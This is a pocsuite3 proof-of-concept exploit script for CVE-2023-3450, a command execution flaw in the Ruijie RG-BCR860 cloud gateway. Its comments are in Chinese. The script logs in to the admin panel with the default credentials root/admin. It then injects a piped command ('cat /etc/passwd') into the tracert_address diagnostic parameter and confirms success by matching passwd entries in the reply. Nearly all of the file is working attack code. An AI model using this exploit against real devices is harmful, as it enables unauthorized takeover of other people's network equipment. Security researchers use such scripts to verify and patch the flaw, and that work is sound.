from collections import OrderedDict
from urllib.parse import urljoin
import re,os,json
from requests_toolbelt import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-08-12'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-08-12'  # 编写 PoC 的日期
    updateDate = '2023-08-12'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/VzTfp8PiskVaZfnmKaoGsg']  # 漏洞地址来源,0day不用写
    name = 'Ruijie RG-BCR860 命令执行漏洞(CVE-2023-3450)'  # PoC 名称
    appPowerLink = 'http://www.ruijiery.com'  # 漏洞厂商主页地址
    appName = 'Ruijie RG-BCR860'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        锐捷 BCR商业无线云网关 存在后台命令执行漏洞，攻击者通过默认口令可以登陆后台构造特殊的参数执行任意命令，获取服务器权限
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = "/cgi-bin/luci/admin"
        url = self.url + path
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
            }
        # 默认管理员密码：admin
        data = 'luci_username=root&luci_password=admin'
        try:
            resq = requests.post(url=url,headers=headers,data=data,verify=False,allow_redirects=False)
            if  resq.status_code == 302 and 'Set-Cookie' in resq.headers:
                cookie = resq.headers['Set-Cookie']
                Location = resq.headers['Location'] 
                headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
                'Cookie':cookie
                }
                # 后台命令执行
                payload = 'cat /etc/passwd'
                for num in range(0,2):
                    url_rce = self.url+ Location + '/diagnosis?diag=tracert&tracert_address=|'+ payload +'&seq='+str(num)+''
                    resq_rce = requests.get(url=url_rce,headers=headers,verify=False)
                    if re.search('root:[x*]?:0:0:', resq_rce.text).group() in resq_rce.text:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['echo'] = json.loads(resq_rce.text)['msg']
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)